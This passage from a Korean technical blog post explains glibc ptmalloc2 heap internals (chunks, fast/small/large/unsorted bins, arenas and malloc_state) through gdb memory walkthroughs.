할당한다.</li><li>그리고 해당 청크 앞에 사용중인 청크가 있기 때문에 그 값에 PREV_INUSE <a href="0x1">P</a> 플래그가 더해진다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/c7jyH0/btqFfunLOTe/96GFUbxbcBdbt3XzQxhGs0/img.png" alt="9"></p><p>프로세스는 free()함수를 이용하여 첫번째 청크(0x602010)를 해제한다.</p><ul><li>이로 인해 0x602010 ~ 0x602018 메모리에 fd, bk 값이 저장된다.</li><li>그리고 두번째 chunk의 prev_size에 해제된 chunk의 크기(0x90)가 저장되고, size에는 PREV_INUSE <a href="0x1">P</a> 플래그 값이 빠진 값이 저장된다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/dZ0SWs/btqFdLKXosg/hy8Ik6Nb19gnuIeWW55fp1/img.png" alt="10"></p><p>할당자로부터 할당받은 세번째 Heap의 포인터는 0x602010이다.</p><ul><li>이 포인터는 처음 할당 된 포인터와 동일하다.</li><li>malloc()은 메모리 효율성을 위해 free chunk를 관리한다.<ul><li>할당자는 메모리의 할당을 요청받으면 free chunk를 먼저 사용한다.</li></ul></li><li>다시 할당받은 chunk는 이전에 저장된 데이터가 초기화 되지 않고 그대로 존재한다.</li><li>변경되는 값은 두번째 chunk의 size값이며, 0x60에서 0x61로 변경된다.<ul><li>두번째 chunk의 앞에 chunk가 할당되어 사용중이기 때문에 PREV_INUSE <a href="0x1">P</a> 플래그 값이 추가되었다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/bMbUx7/btqFec2DDCv/SrOhtmPmupkW9mEejnI2kk/img.png" alt="11"></p><p>새로 할당받은 heap 메모리는 정상적으로 사용가능하다.</p><ul><li>값을 입력하게 되면 이전에 저장되어 있던 값을 덮어쓰게 된다.</li></ul><h3 id="Free-Chunk"><a href="#Free-Chunk" class="headerlink" title="Free Chunk"></a>Free Chunk</h3><p><img src="https://blog.kakaocdn.net/dn/XfnRd/btqFec9ofBF/zl2LCpjRzmQEhudRNFWXk0/img.png" alt="12"></p><p>Free chunk는 할당자에게 반환된 chunk 이다.</p><ul><li>Chunk의 크기에 따라 fd, bk, fd_nextsize, bk_nextsize의 값이 해당 chunk내에 저장된다.<ul><li>Chunk의 크기가 최소의 크기 일 경우 fd_nextsize, bk_nextsize의 값을 저장할 수 없다.</li><li>이 경우 Free chunk의 크기가 커지지 않는다.<ul><li>해당 chunk는 prev_size, size, fd, bk 값만을 메모리에 저장한다.</li><li>fd_nextsize, bk_nextsize는 오직 large bin에서만 사용된다.</li></ul></li></ul></li></ul><p><strong>example</strong></p><p><img src="https://blog.kakaocdn.net/dn/eouLHz/btqFgwSXqQ3/FiKp4HkWub83rtiKK23bok/img.png" alt="13"></p><p><img src="https://blog.kakaocdn.net/dn/DtUdh/btqFgwZIuOK/T5L3wrFCtIsKRFUyUmiQx1/img.png" alt="14"></p><p>할당자가 할당한 메모리는 다음과 같다.</p><ul><li>chunk의 크기가 128바이트인 메모리가 3개(0x602010, 0x6020c0, 0x602170) 할당되었다. (0x90)</li><li>chunk의 크기가 8바이트인 메모리가 3개(0x6020a0, 0x602150, 0x602200) 할당되었다. (0x20)</li></ul><p><img src="https://blog.kakaocdn.net/dn/uBdWR/btqFe3xaLQR/QLa8KkKN6LeFwfjYiHUGnk/img.png" alt="15"></p><p>heap1(0x602010)이 해제되면 해당 chunk에 bk,fd 값이 저장된다.</p><ul><li>이전 청크의 크기(0x90)는 tmp2(0x6020a0)의 “prev_size”에 저장되며, “size”에는 PREV_INUSE [P] (0x1) 플래그의 값을 뺀 값(0x20)이 저장된다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/dNckmz/btqFgyiWeTR/fWJdF3fq5KRrcFqhTKoB90/img.png" alt="16"></p><p>heap2(0x6020c0)가 해제되면 해당 chunk에 fd, bk값이 저장된다.</p><ul><li>fd(0x6020c0)에 저장되는 값은 해당 chunk 앞에 있는 Free chunk의 mchunkptr(0x602000)이다.</li><li>그리고 heap1의 bk(0x602018)에 heap2의 mchunkptr(0x6020b0)이 저장된다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/nctV3/btqFedtL1xH/Ox0QwWePghRe6KOPwwbsQ0/img.png" alt="17"></p><p>heap3(0x602170)가 해제되면 fd(0x602170)에 해당 chunk 앞에 있는 Free chunk의 mchunkptr(0x6020b0)이 저장된다.</p><ul><li>그리고 heap2의 bk(0x6020c8)에 heap3의 mchunkptr(0x602160)이 저장된다.</li></ul><h2 id="Bin"><a href="#Bin" class="headerlink" title="Bin"></a>Bin</h2><p>해제된 힙 청크(Free Chunk)는 bin이라는 freelist 구조체를 통해 관리된다.</p><ul><li><p>freelist란 동적으로 메모리를 할당하고 해제할 때 메모리 관리의 효율을 높이기 위해 할당되지 않은 영역을 관리하는 연결 리스트이다.</p></li><li><p>영역을 해제할 때 해제하려는 영역을 freelist에 추가하고, 할당 요청이 들어왔을 때 freelist에 추가된 영역을 제거하고 해당 영역을 사용힌다.</p></li><li><p>bins의 종류에는 Fast bin, Small bin, Large bin, Unsorted bin이 있다.</p></li><li><p>fastbinsY - 이 배열은 fast bin을 수용한다.</p></li><li><p>bins - 이 배열은 unsorted, small, large bin을 수용한다. 총 126개의 bin이 있다.</p><ul><li>Bin 1 - Unsorted bin (1개)</li><li>Bin 2 ~ Bin 63 - Small bin (62개)</li><li>Bin 64 ~ Bin 126 - Large bin (63개)</li></ul></li></ul><h3 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h3><p><img src="https://blog.kakaocdn.net/dn/AQBjs/btqFhmo94if/6SppT0OKZKXyFkyf8wuWv1/img.png" alt="18"><br><img src="https://blog.kakaocdn.net/dn/DxPpL/btqFhLhVOaS/zoUGSmneXQdF8xxjUXkbSk/img.png" alt="19"></p><p>M_MXFAST(1)라는 매개변수를 사용해서 “fastbin”에 포함되는 청크의 범위를 설정한다.</p><ul><li>“fastbin”에 포함되는 chunk 크기의 범위는 0에서 80*sizeof(size_t)/4까지 이다. </li><li>“fastbin”의 기본 범위는 0에서 64*sizeof(size_t)/4 이다. (mallopt() 함수로 확장 가능)</li><li>32비트 아키텍처에서 패스트빈의 상한은 64byte(64<em>4/4)이며, 64비트 아키텍처에서는 128byte(64</em>8/4)이다.<ul><li>해당 크기보다 작은 chunk들이 fastbin에 배치된다.</li></ul></li><li>해당 크기는 매개변수 “value”를 이용하여 변경할 수 있다.<ul><li>매개변수를 최대로 설정하면 32비트 아키텍처에서는 최대 80byte(80<em>4/4), 64bit에서는 최대 160byte(80</em>8/4)의 상한을 설정 할 수 있다.</li><li>fast bin을 비활성화하려면 0으로 설정하면 된다.</li></ul></li><li>Fastbin은 LIFO(last in, first out)를 사용한다.<ul><li>마지막으로 해제 된 chunk가 먼저 재 할당된다.</li></ul></li><li>해당 bin은 최대 10개의 bin 관리 할 수 있으며, 패스트빈의 상한 값보다 크기가 작은 chunk들을 관리한다.<ul><li>64bit 아키텍처의 경우 Fastbin에 포함되는 chunk의 크기는 32, 48, 64, 80, 96, 112, 128 이다.</li><li>32bit 아키텍처의 경우 Fastbin에 포함되는 chunk의 크기는 16, 24, 32, 40, 48, 56, 64 이다.</li></ul></li><li>해당 bin은 single-linked list로 구성된다.<ul><li>같은 크기의 chunk가 해제되면 마지막으로 해제된 chunk의 fd에 새로 해제된 chunk의 mchunkptr을 저장된다.</li><li>bk는 사용하지 않는다.</li></ul></li><li>해당 bin에 포함되는 chunk들은 서로 인접해 있어도 병합하지 않는다.</li></ul><p><strong>example</strong></p><p><img src="https://blog.kakaocdn.net/dn/zOfPF/btqFg3jwPXh/VsfZogqPikwzk114kw4yU1/img.png" alt="20"></p><p>마지막 free()를 호출한 다음의 코드에 Breakpoint를 설정하고 프로그램을 실행한다.</p><ul><li>main_arena의 정보는 gdb에 “p main_arena” 명령어를 입력하면 확인할 수 있다.</li><li>해제된 chunk들 중 fastbin에 포함되는 chunk들은 fastbinsY에 배치되어 있다.</li><li>배치된 chunk들의 크기는 0x20(32) ~ 0x80(128)이다.</li><li>malloc(16) ~ malloc(112) -&gt; 0x20(32) ~ 0x80(128)</li></ul><p>fastbin에서 동일한 chunk들의 관리</p><p><img src="https://blog.kakaocdn.net/dn/cS6x8D/btqFhlYyOf6/sry7c1SQ3CX42WHpOXsrFk/img.png" alt="21"></p><p>해제된 chunk들 중 가장 나중에 free된 chunk가 fastbinsY에 배치된다.</p><ul><li>이 chunk의 fd에는 두번째 free chunk의 mchunkptr이 저장되어 있다.</li><li>그리고 두번째 chunk의 fd에는 세번째 chunk의 mchunkptr이 저장되어 있다. (뒤로 갈수록 가장 먼저 free된 chunk)</li><li>bk에는 어떠한 값도 배치되지 않는다.</li><li>single-linked list 형태로 fastbin들이 연결된다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/boJPOL/btqFgx6wsDn/mzkjbx0coKUHCg8HPwsQGk/img.png" alt="22"></p><p>malloc()에 크기가 16byte인 메모리의 할당을 요청하면, Allocater는 해당 크기과 동일한 free chunk가 있는지 fastbinsY에서 확인한다.</p><ul><li>할당자는 fastbinsY에 동일한 크기의 chunk가 있다면 해당 chunk를 재할당한다.</li><li>fastbinsY에는 두번째 free chunk가 배치되었고, 첫번째(가장 최근에 free된) free chunk가 반환되었다.</li><li>반환된 chunk에 값이 정상적으로 써진다. </li></ul><p><img src="https://blog.kakaocdn.net/dn/dpwJYU/btqFiOZ2dg6/hdE10QjVoTAWHTckvm5840/img.png" alt="23"></p><h3 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h3><p><img src="https://blog.kakaocdn.net/dn/cqewZI/btqFiAhMME9/Z8kFVHvkUF28BxSlq3O7U1/img.png" alt="24"></p><ul><li>Small bin이 포함하는 chunk는 크기가 MIN_LARGE_SIZE 보다 작은 chunk들이다.<ul><li>32bit 시스템은 MALLOC_ALIGNMENT는 8이고, SIZE_SZ는 4이다.<ul><li>MIN_LARGE_SIZE는 512((64 - 0) * 8)이다.</li></ul></li><li>64bit 시스템은 MALLOC_ALIGNMENT는 16이고,SIZE_SZ는 8이다.<ul><li>MIN_LARGE_SIZE는 1024((64 * 0) * 16)이다.</li></ul></li><li>즉, 32bit 시스템에서 Small bin의 범위는 16<del>504byte(64*8-8)이며 64bit에서는 32</del>1008byte이다.</li></ul></li><li>해당 bin은 62개의 bin들을 관리하며, doubly-linked list로 구성된다.<ul><li>같은 크기의 chunk가 해제되면 마지막으로 해제된 chunk의 bk에 새로 해제된(나중에 해제된) chunk의 mchunkptr가 저장된다.</li><li>새로 해제된 chunk의 fd에 마지막으로 해제된(먼저 해제된) 같은 크기의 chunk의 mchunkptr가 저장된다.</li></ul></li><li>Small bin은 FIFO(First In, First Out)을 사용한다.<ul><li>먼저 해제 된 청크가 먼저 재 할당된다.</li></ul></li><li>Small bin에 해당되는 chunk들은 서로 인접하게 배치될수 없다.<ul><li>해당 chunk가 서로 인접해 있을 경우 하나의 chunk로 병합된다.</li></ul></li><li>Small bin은 각 16바이트 크기를 가지는 청크 binlist를 가진다.<ul><li>ex) 첫 번째 Small bin(Bin 2)은 32바이트 크기의 청크 binlist를 가지며, 두 번째 small bin(Bin 3)은 48바이트 크기의 청크 binlist를 가지는 식으로, 이어진다.</li></ul></li></ul><p>bin의 인덱스는 smallbin_index() 함수를 이용하여 확인 할 수 있다.</p><ul><li>이함수는 SMALLBIN_WIDTH을 사용해서 해당 시스템이 32bit인지 64bit인지 확인한다.<ul><li>64bit의 경우 chunk 크기를 16으로, 32bit의 경우 chunk의 크기를 8로 나눈다음, 그 값에 SMALLBIN_CORRECTION를 더 한다.</li><li>이 값이 해당 chunk에 대한 bin 인덱스 이다.</li></ul></li><li>예를 들어 64bit에서 144byte의 free chunk의 bin의 인덱스는 9(144 &gt;&gt; 4 + 0)이다. bin 9</li><li>free chunk의 인덱스는 ((144 &gt;&gt; 4 + 0) - 1) * 2 = 16(fd),17(bk) 이다.</li></ul><p><strong>example</strong></p><p><img src="https://blog.kakaocdn.net/dn/cgiar4/btqFkmQburO/WBtrk4YETygknSGVBlLANk/img.png" alt="25"></p><p>사이즈가 128byte인 메모리 3개와 200byte 1개와 160byte 2개, 그리고 해당 메모리 사이에 16byte 메모리 할당을 요청한다.</p><ul><li>“small*”변수들이 가리키는 메모리들 사이에 16byte의 메모리 할당을 요청하지 않으면 Small bin에 해당하는 chunk들이 연속으로 배치되기 때문에 서로 병합된다.</li><li>“small*”변수들이 가리키는 메모리들을 모두 해제한 후 200byte, 128byte의 메모리 할당을 요청한다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/btK37x/btqFhlZLYK5/wZcwR1N2jH9481u8srVWL1/img.png" alt="26"></p><ul><li>free chunk들은 먼저 Unsorted bin에 배치되기 때문에 마지막에 해제된 chunk는 Unsorted bin에서 찾을 수 있다.<ul><li>해당 어플리케이션에서 마지막에 해제된 chunk는 0x602300이며, 크기는 176byte이다.</li><li>free()를 이용하여 해제할 메모리는 0x6023c0이며, 이 메모리는 마지막에 해제된 chunk과 인접해 있다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/bGZW6h/btqFjdfn7zH/2VkQTQ0KnjJ4AKHcnkykok/img.png" alt="27"></p><ul><li>free()가 실행되면 두 chunk는 병합되어 하나의 chunk가 된다.<ul><li>해당 chunk(0x602300)의 크기가 352byte가 되었다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/bnr7IZ/btqFjFWOLAJ/CDOl4QlxW43IHj4zvIsqW1/img.png" alt="28"></p><ul><li>크기가 144 (128 + 16) 바이트 인 청크의 인덱스는 16과 17이다.</li><li>Unsorted bin에 있던 chunk가 재할당되면 list의 연결이 끊기기 때문에, Allocator는 연결이 끊긴 chunk들을 bins에 배치한다.<ul><li>크기가 128byte인 free chunk가 3개 있다.</li><li>이 중에서 bins<a href="fd">16</a>에는 마지막에 해제된 chunk가, bins<a href="bk">17</a>에는 먼저 해제된 chunk가 배치된다.</li></ul></li><li>할당자는 해당 chunk 앞,뒤에 있는 chunk의 mchunkptr를 fd와 bk에 배치한다.<ul><li>첫번째에 있는 chunk와 끝에 있는 chunk는 fd, bk에 “bins”의 주소를 배치한다.</li><li>할당자는 free chunk에 배치된 “bins”의 주소를 하나의 chunk로 본다.</li><li>그래서 할당자는 bins[idx]의 주소에서 16을 뺀 주소를 사용한다.</li><li>이것은 doubly-linked list 형태이다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/chdXE9/btqFhLjCvvc/QXgz6thKdgNxZVXE8zfZo0/img.png" alt="29"></p><p>어플리케이션이 Small bin에 배치된 chunk와 동일한 크기의 메모리 할당을 요청하면, 할당자는 먼저 해제되었던 chunk(0x6020c0)를 재할당한다.</p><ul><li>그리고 해당 chunk(0x6020c0) 뒤에 있던 chunk(0x602000)가 bins[17]에 배치된다.</li></ul><p><strong>example2</strong></p><p><img src="https://blog.kakaocdn.net/dn/brJQKB/btqFiAIXUZH/Gt37rSbONdx1NZeI8579m1/img.png" alt="30"></p><ul><li>크기가 272byte인 chunk의 인덱스는 (272/16 -1) * 2 = 32(fd), 33(bk)이다. </li><li>bins[32],bins[33]은 bins17으로 하나의 주소를 사용한다.  (bins[30],bins[31] = bins16으로 하나의 주소 사용)</li><li>맨처음에 해제된 chunk의 mchunkptr는 bins[33]에 배치된다.</li><li>맨마지막에 해제된 chunk의 mchunkptr는 bins[32]에 배치된다.</li></ul><h3 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h3><ul><li>Large bin이 포함하는 chunk의 크기가 MIN_LARGE_SIZE와 같거나 큰 chunk들이다.<ul><li>64bit 아키텍처의 경우 free chunk의 크기가 1024와 같거나 크면 해당 chunk는 Larger bin에 배치된다.</li></ul></li><li>Large bin이 포함하는 chunk들은 서로 인접해 있을 경우 하나의 chunk로 병합된다.</li><li>Large bin은 63개의 bin을 사용하며, small bin과 같이 doubly-linked list로 구성된다.<ul><li>그러나 Large bin은 Small Bin과 다르게 하나의 bin에 다양한 크기의 chunk들을 보관한다.</li><li>해당 bin들은 bin내에서 크기 별로 정렬되어 할당의 효율성을 높인다.</li></ul></li></ul><p>(32bit)</p><ul><li><p>32개의 bin은 각 64바이트 크기를 가지는 청크의 binlist를 가진다.</p><ul><li>ie) 첫 번째 large bin(Bin 65)은 512바이트 ~ 568바이트 크기의 청크 binlist를 가지고,</li><li>두 번째 large bin(Bin 66)은 576바이트 ~ 632바이트 크기의 청크 binlist를 가지는 식으로, 이어진다.</li></ul></li><li><p>16개의 bin은 각 512바이트 크기를 가지는 청크의 binlist를 가진다.</p></li><li><p>8개의 bin은 각 4,096바이트 크기를 가지는 청크의 binlist를 가진다.</p></li><li><p>4개의 bin은 각 32,768바이트 크기를 가지는 청크의 binlist를 가진다.</p></li><li><p>2개의 bin은 각 262,144바이트 크기를 가지는 청크의 binlist를 가진다.</p></li><li><p>1개의 bin은 남은 크기를 가지는 청크를 가진다.</p></li><li><p>small bin과 달리, large bin 내부의 청크는 동일한 크기를 가지고 있지 않다. 따라서, 내림차순으로 저장된다.</p><ul><li>가장 큰 청크는 binlist의 가장 앞쪽에 저장되고, 가장 작은 청크는 binlist의 가장 뒷쪽에 저장된다.</li><li>fd로 갈 수록 크기가 작고, bk로 갈 수록 크기가 크다.</li></ul></li><li><p>fd_nextsize(나보다 작은 크기)와 bk_nextsize(나보다 큰 크기)를 사용하여 크기 순으로 정렬, 동일한 크기의 chunk 끼리는 연결되지 않는다. </p></li></ul><p><img src="https://blog.kakaocdn.net/dn/cUEc85/btqFhLxbVnC/uH1J1YDy5Upqf6YI2SXWFk/img.png" alt="31"><br><img src="https://blog.kakaocdn.net/dn/CSE3x/btqFhK6aLHL/eAltZ7LMuR0wVnMavYMbT1/img.png" alt="32"></p><p>Large bin에 해당하는 chunk들의 인덱스는 largebin_index_32(), largebin_index_64() 함수를 이용하여 확인할 수 있다.</p><ul><li>free chunk의 크기를 쉬프트 연산을 이용하여 나누고, 그 값이 조건에 만족하는 값이라면 기본 인덱스 값을 더한 값이 해당 chunk의 인덱스 값이 된다.</li><li>ex)64bit 아키텍처에서 chunk의 크기가 3072 ~ 3120인 chunk들은 bin[96]에 보관된다. 48 + (3072 &gt;&gt; 6) = 96</li></ul><p><strong>example</strong></p><p><img src="https://blog.kakaocdn.net/dn/c2OJGW/btqFknn903G/RGEggi2wqPM9veObJXAveK/img.png" alt="33"></p><p>1024, 1040, 1056 byte인 메모리 3개, 200byte 1개, 1120byte 2개, 그리고 해당 메모리 사이에 16byte 메모리 할당을 요청한다.</p><ul><li>“large*” 변수가 가리키는 메모리들 사이에 16byte의 메모리 할당을 요청하지 않으면 Large bin에 해당하는 chunk들이 연속으로 배치되기 때문에 서로 병합된다.</li><li>“large*” 변수가 가리키는 메모리들을 모두 해제한 후 200byte, 1040byte의 메모리 할당을 요청한다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/E3OQ5/btqFhMv8yTv/w6wYv3RKvESRQGwFVrWEGk/img.png" alt="34"></p><ul><li>마지막으로 해제된 chunk는 0x602db0이며, 크기는 1136byte이다.<ul><li>free()를 이용하여 해제할 메모리는 0x603230이며, 이 메모리는 마지막에 해제된 chunk과 인접해 있다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/tCTOL/btqFiOAeHPF/ECdWw4C4lVD0kIqPwVCRMk/img.png" alt="35"></p><ul><li>free()가 실행되면 두 chunk는 병합되어 하나의 chunk가 된다<ul><li>해당 chunk(0x602db0)의 크기가 2272byte가 되었다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/cc2ObH/btqFjFbv2sp/GPguvCaoRvlKxNQ2kntYD0/img.png" alt="36"></p><p>크기가 1040(1024 + 16)byte 인 chunk의 인덱스는 126 및 127이다.</p><ul><li>Large bin은 Small bin과 동일하게 doubly-linked list 로 chunk들을 연결한다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/mevsd/btqFiy5vG7r/xOIVDMEukkT7MP6yCYKdc0/img.png" alt="37"></p><p>할당자는 Large bin에 해당하는 chunk가 “bins”에 배치될때 해당 인덱스에 해당하는 chunk들을 크기 별로 정렬한다.</p><ul><li>Chunk가 Unsorted bin에 있을 때는 해제된 순서대로 연결되어 있다.<ul><li>0x602870 (size : 0x430) &lt;–&gt; 0x602000 (size : 0x410) &lt;–&gt; 0x602430 (size : 0x420)</li></ul></li><li>하지만 Chunk가 “bins”에 배치되면 chunk의 크기순으로 정렬된다.<ul><li>0x602870 (size : 0x430) &lt;–&gt; 0x602430 (size : 0x420) &lt;–&gt; 0x602000 (size : 0x410)</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/baowZv/btqFiAPQIvH/KCwqL2rOYfMYyygZqLbke0/img.png" alt="38"></p><p>Large bin에 배치된 chunk와 동일한 크기의 메모리 할당을 요청하면, 할당자는 요청한 크기와 동일한 chunk(0x602440)를 재할당한다.</p><h3 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted bin"></a>unsorted bin</h3><ul><li>청크를 분할한 후에 남은 chunk와 반환된 모든 청크는 Unsorted bin에 먼저 배치된다.<ul><li>해당 bin은 Chunk 크기에 대한 제한이 없기 때문에 다양한 크기의 청크가 해당 Bin에 저장될 수 있다. </li><li>그러나 Fast bin에 해당하는 chunk는 Unsorted bin에 배치 되지 않는다.</li><li>할당자는 Unsorted bin에 요청받은 메모리의 크기와 같은 chunk가 있다면 해당 chunk를 재할당한다.</li></ul></li><li>Unsorted Bin은 1개의 bin만 사용하며, doubly-linked list와 FIFO를 사용한다.<ul><li>해당 bin을 이용해 적절한 bin을 찾는 시간이 덜 걸리므로 할당과 해제의 처리가 빠르다.</li></ul></li><li>Allocator에 의해 검색된 Chunk는 바로 재할당 되거나 아니면 원래의 Bin에 배치된다.<ul><li>unsorted bin의 모든 chunk는 재할당을 위한 1번의 기회가 주어진다. </li><li>재할당에 실패한 경우, 크기에 따라 small bin이나 large bin에 재배치된다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/uVAnF/btqFkI6IZp7/oebaRO9mgzu9oaiv4E4jAk/img.png" alt="39"></p><h3 id="fastbinsY-amp-bins"><a href="#fastbinsY-amp-bins" class="headerlink" title="fastbinsY &amp; bins"></a>fastbinsY &amp; bins</h3><p><img src="https://blog.kakaocdn.net/dn/bcQlgE/btqFhMwaVTB/2in6j4lpemr5md3bwqXk9K/img.png" alt="40"><br><img src="https://blog.kakaocdn.net/dn/zNDin/btqFhK6dOm8/FvFKxNxqVLlXiNKRqxKV31/img.png" alt="41"></p><h2 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h2><ul><li>ptmalloc2는 각 스레드가 서로 간섭하지 않고, 서로 다른 메모리 영역에 액세스 할 수 있게 한다.<ul><li>이러한 메모리 영역을 “Arena”라고한다.</li><li>Main을 포함한 모든 각 Threads에 대한 힙 영역이라고 할 수 있다.</li><li>모든 Threads가 각자의 Arena를 가지진 못 하고 32bit와 64bit System과 시스템의 Core 갯수에 따라 Arena의 갯수에 제한이 있다.</li><li>제한을 넘어 Arena가 필요한 경우는 기존에 사용하던 Arena를 재사용한다.</li></ul></li><li>응용 프로그램에는 “main arena”이라는 arena가 있다.<ul><li>malloc()에는 이 arena를 가리키는 정적 변수가 있으며 각 arena에는 추가 arena를 연결하는 다음 포인터가 있다.</li></ul></li><li>각 Arena는 하나 이상의 힙 메모리를 얻는다.<ul><li>main arena는 프로그램의 초기 힙을 사용한다 (.bss 등 직후 시작)</li><li>main arena는 힙 공간이 부족하면 확장하여 사용하기 때문에 추가로 힙을 할당 할 필요가 없다. </li><li>추가 Arena는 mmap를 통해 힙에 메모리를 할당하고, 이전 힙이 소모되면 더 많은 힙을 힙목록에 추가한다.</li></ul></li><li>Arena는 heap 메모리에서 할당된 chunk들을 관리한다.<ul><li>Arena에서 관리되는 chunk들은 응용 프로그램에서 사용 중이거나 사용이 가능한 chunk들 이다.</li><li>사용중인 청크는 Arena에서 추적되지 않는다.</li><li>Free chunk는 크기와 히스토리에 따라 분류되어 arena에 저장된다.</li><li>할당자는 arena에서 할당 요청을 충족하는 chunk를 신속하게 찾을 수 있다.</li></ul></li><li>Arena의 개수는 현재 시스템의 core의 수에 기반된다.<ul><li>For 32 bit systems: Number of arena = 2 * number of cores.</li><li>For 64 bit systems: Number of arena = 8 * number of cores.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/dcqJcI/btqFkmwV7Is/49edJHR7GX4xYlIfl2ny30/img.png" alt="42"></p><p>malloc.c 코드내에 “main_arena”라는 변수가 존재한다.</p><ul><li>이 변수가 앞에서 언급한 main arena이다. </li><li>해당 변수는 “struct malloc_state” 구조체를 사용한다.</li></ul><h2 id="구조체-정리"><a href="#구조체-정리" class="headerlink" title="구조체 정리"></a>구조체 정리</h2><h3 id="struct-malloc-info-Heap-Header"><a href="#struct-malloc-info-Heap-Header" class="headerlink" title="struct malloc_info (Heap_Header)"></a>struct malloc_info (Heap_Header)</h3><p><img src="https://blog.kakaocdn.net/dn/d1PLuz/btqFkTOrxdy/jhgbamKIK9bLWaQeQ6bKmK/img.png" alt="43"></p><ul><li>Arena는 각 Threads에 대한 힙 영역이기 때문에 힙 영역의 공간이 부족하면 새로운 영역에 추가로 할당받아 여러 개의 힙 영역을 가질 수 있다(Main Thread 제외).</li><li>이런 힙 영역은 어떤 Arena가 관리하고 있는지, 힙 영역의 크기가 어느정도인지, 이전에 사용하던 heap 영역의 정보가 어디에 있는지를 저장할 필요가 있다.</li><li>이런 정보를 저장하기 위한 구조체가 malloc_info 구조체이며, 힙에 대한 정보를 저장하기 때문에 Heap_Header라고도 할 수 있다(Main Thread는 확장을 해서 쓰기 때문에 제외)</li></ul><h3 id="struct-malloc-state-Arena-Header"><a href="#struct-malloc-state-Arena-Header" class="headerlink" title="struct malloc_state (Arena Header)"></a>struct malloc_state (Arena Header)</h3><p><img src="https://blog.kakaocdn.net/dn/bu8Mpb/btqFknWMET1/0Qa8di0M5Hv1cAvxn4JCtK/img.png" alt="44"></p><ul><li>위의 Heap_Header에서는 단순히 힙 영역에 대한 정보만을 저장하였기 때문에, 힙 영역에서도 어떤 부분을 사용하면 되는지에 대해 Arena는 이를 관리하기 때문에 알고 있을 필요가 있다.</li><li>malloc_state 구조체는 각 Arena에 하나씩 주어지고, 해제된 Chunk를 관리하는 연결리스트 bin과 최상위 Chunk인 top chunk와 같은 Arena에 대한 정보를 저장한다.</li><li>단일 스레드 arena는 여러 개의 힙을 가질 수 있지만, 이러한 모든 힙에 대해서는 오직 하나의 arena header만이 존재한다.</li><li>“malloc_state”의 구조는 다음과 같다.</li><li>mutex는 해당 arena에 대한 액세스를 제어하는 데 사용된다.<ul><li>mutex를 이용하여 여러 스레드간에 arena 사용 충돌이 발생하것을 방지한다.</li><li>패스트 빈에 대한 액세스와 같은 일부 작업은 arena를 잠글 필요가 없다.</li><li>이 외에 다른 모든 작업을 하려면 스레드가 arena를 잠글 필요가 있다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/buIpXb/btqFmuUOOJe/tbPsbUnOajN6gTH86fu6c1/img.png" alt="45"></p><p>main_arena의 flags는 2개의 bit로 정보들의 유무를 나타낸다.</p><ul><li>첫번째bit는 해당 Arena가 fastbin(fastchunk)를 가지고 있는지 나타낸다.<ul><li>fastbin(fastchunk)이 arena에 있다면 첫번째 bit의 값은 0이, 없다면 1이 보관 된다.</li></ul></li><li>두번째bit는 해당 Arena가 인접한지를 나타낸다.<ul><li>해당 arena가 인접한 arena라면 1이, 아니라면 0이 표시된다.</li><li>Non-main arena는 하위 힙으로 구성되며 항상 NONCONTIGUOUS_BIT가 설정된다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/JKQMg/btqFk76SEEw/i1fTEMbt85aI8ch6KKyoJ1/img.png" alt="46"></p><p>fastbins에 fastbin에 해당하는 free chunk가 배치된다.</p><ul><li>fastbin에 해당하는 chunk의 인덱스는 fastbin_index()함수를 이용하여 확인할 수 있다.</li><li>해당 함수는 우측 시프트를 이용하여 chunk의 크기(sz)를 8(32bit) 또는 16(64bit)으로 나눈 값에 2를 뺀다.</li><li>ex)64bit 아키텍처에서 크기가 32byte인 chunk의 인덱스는 0((32 &gt;&gt; 4) - 2)이다.</li></ul><p><img src="https://blog.kakaocdn.net/dn/ljz1L/btqFjqNnUv6/4vAXUaah7F1dew2KwTdRC1/img.png" alt="47"></p><p>top에는 Top chunk가 배치된다.</p><ul><li>Top chunk는 Arena의 가장 상위 영역에 있는 Chunk이며, bin에 포함되지 않는다.</li><li>Top chunk는 PREV_INUSE 플래그가 설정된다.</li><li>Top chunk는 요청한 힙을 할당할 수 있는 충분한 청크가 bin에 없는 경우에 사용된다.</li><li>Top chunk의 크기가 사용자가 요청한 크기보다 큰 경우 top chunk는 2개로 분리된다.<ul><li>(사용자가 요청한 크기의 청크와 분할되고 남은 크기의 나머지 청크(Remainder chunk))</li></ul></li><li>Remainder chunk는 새로운 Top chunk가 된다.</li><li>할당자는 Top chunk의 크기가 사용자가 요청한 크기보다 작은 경우 조건에 따라 Top chunk의 크기를 증가시키거나, 새로운 Heap영역을 할당한다.<ul><li>할당자는 요청받은 chunk의 크기가 DEFAULT_MMAP_THRESHOLD(131072)보다 큰경우 mmap()을 호출하여 새로운 Heap 영역을 매핑한다.</li></ul></li></ul><p><img src="https://blog.kakaocdn.net/dn/pqv0s/btqFknCCVTE/754R5SKZwD1yKafQukbbBK/img.png" alt="48"></p><p>할당자는 메모리를 할당하기에 arena의 공간이 부족할 경우 sbrk()를 호출하여 메모리의 공간을 증가시킨다.</p><ul><li>malloc.c에서는 MORECORE라는 매크로를 이용하여 sbrk() 함수를 호출한다.</li></ul><p>last_remainder에는 